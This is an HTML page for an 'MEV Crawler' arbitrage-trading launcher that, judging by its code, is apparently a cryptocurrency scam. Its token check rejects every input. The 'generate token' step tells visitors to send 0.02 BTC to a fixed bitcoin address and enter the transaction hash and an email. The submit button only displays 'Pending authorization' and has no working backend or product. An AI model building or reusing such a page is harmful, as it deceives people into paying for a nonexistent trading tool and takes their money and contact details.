<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Mev Launcher</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: "Courier New", monospace;
    }

    body {
      background: black;
      color: #00ff00;
      height: 100vh;
      overflow: hidden;
    }

    canvas {
      position: fixed;
      top: 0;
      left: 0;
      z-index: -1;
    }

    .page {
      display: none;
      min-height: 100vh;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      text-align: center;
      padding: 20px;
    }

    .page.active {
      display: flex;
    }

    h1 {
      margin-bottom: 20px;
      text-shadow: 0 0 10px #00ff00;
      font-size: clamp(1.2rem, 4vw, 2rem);
    }

    h2 {
      font-size: clamp(1rem, 3vw, 1.5rem);
    }

    button {
      padding: 12px 30px;
      font-size: 1rem;
      background: black;
      color: #00ff00;
      border: 2px solid #00ff00;
      cursor: pointer;
      box-shadow: 0 0 15px #00ff00;
      transition: 0.3s ease;
      margin: 8px;
      width: 100%;
      max-width: 300px;
    }

    button:hover {
      background: #00ff00;
      color: black;
      box-shadow: 0 0 30px #00ff00;
    }

    input {
      padding: 12px;
      font-size: 1rem;
      background: black;
      color: #00ff00;
      border: 2px solid #00ff00;
      width: 100%;
      max-width: 300px;
      margin: 10px 0;
      text-align: center;
    }

    .box {
      margin-top: 15px;
      padding: 12px;
      border: 1px solid #00ff00;
      width: 100%;
      max-width: 320px;
      box-shadow: 0 0 10px #00ff00;
      font-size: 0.9rem;
      word-wrap: break-word;
    }

    .about {
      margin-top: 20px;
      width: 100%;
      max-width: 320px;
      border: 1px solid #00ff00;
      padding: 15px;
      box-shadow: 0 0 10px #00ff00;
      font-size: 0.9rem;
    }

    @media (max-width: 480px) {
      h1 {
        font-size: 1.3rem;
      }

      button {
        font-size: 0.95rem;
        padding: 10px 20px;
      }

      input {
        font-size: 0.9rem;
      }

      .box, .about {
        font-size: 0.85rem;
      }
    }
  </style>
</head>
<body>

<canvas id="matrix"></canvas>

<!-- PAGE 1 -->
<div id="homePage" class="page active">
  <h1>WELCOME TO Mev Crawler 2.1.1</h1>
  <button onclick="showPage('tokenPage')">LAUNCH</button>

  <div class="about">
    <h2>About Us</h2>
    <p>
      We are a futuristic system for arbitrage trading.
      Completely decentralized and user friendly.
    </p>
  </div>
</div>

<!-- PAGE 2 -->
<div id="tokenPage" class="page">
  <h1>TOKEN</h1>

  <input type="text" id="tokenInput" placeholder="Enter your token">
  <button onclick="enterToken()">ENTER</button>

  <div>
    <button onclick="showPage('formPage')">GENERATE TOKEN</button>
    <button onclick="showPage('homePage')">BACK</button>
  </div>

  <div class="box" id="tokenOutput">
    Awaiting input...
  </div>
</div>

<!-- PAGE 3 -->
<div id="formPage" class="page">
  <h1>Send 0.02 BTC to bc1q7vcdzhle68wdjhqflpdyqha5ws9qjdmf4ek3ys</h1>

  <input type="text" id="nameInput" placeholder="Enter Transaction hash">
  <input type="email" id="emailInput" placeholder="Enter your email">

  <div>
    <button onclick="submitForm()">SUBMIT</button>
    <button onclick="showPage('tokenPage')">BACK</button>
  </div>

  <div class="box" id="formOutput">
    Awaiting user details...
  </div>
</div>

<script>
  const canvas = document.getElementById("matrix");
  const ctx = canvas.getContext("2d");

  function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  }

  resizeCanvas();
  window.addEventListener("resize", resizeCanvas);

  const letters = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const fontSize = 16;
  let columns = canvas.width / fontSize;
  let drops = [];

  function initMatrix() {
    columns = Math.floor(canvas.width / fontSize);
    drops = [];
    for (let i = 0; i < columns; i++) drops[i] = 1;
  }

  initMatrix();

  function drawMatrix() {
    ctx.fillStyle = "rgba(0,0,0,0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    ctx.fillStyle = "#00ff00";
    ctx.font = fontSize + "px monospace";

    for (let i = 0; i < drops.length; i++) {
      const text = letters.charAt(Math.floor(Math.random() * letters.length));
      ctx.fillText(text, i * fontSize, drops[i] * fontSize);

      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
        drops[i] = 0;
      }
      drops[i]++;
    }
  }

  setInterval(drawMatrix, 35);

  window.addEventListener("resize", initMatrix);

  function showPage(pageId) {
    document.querySelectorAll(".page").forEach(page => {
      page.classList.remove("active");
    });
    document.getElementById(pageId).classList.add("active");
  }

  function enterToken() {
    const token = document.getElementById("tokenInput").value;
    const output = document.getElementById("tokenOutput");

    if (!token) {
      output.innerHTML = "No token entered.";
      return;
    }

    output.innerHTML =
      "❌ ACCESS DENIED<br><br>" +
      "Invalid token detected.<br><br>" +
      "Please request access using GENERATE TOKEN.";
  }

  function submitForm() {
    const name = document.getElementById("nameInput").value;
    const email = document.getElementById("emailInput").value;
    const output = document.getElementById("formOutput");

    if (!name || !email) {
      output.innerHTML = "Please enter both Transaction Hash and Email.";
      return;
    }

    output.innerHTML =
      "ACCESS REQUEST RECEIVED<br><br>" +
      "Transaction Hash: " + name + "<br>" +
      "Email: " + email + "<br><br>" +
      "Status: Pending authorization...";
  }
</script>

</body>
</html>
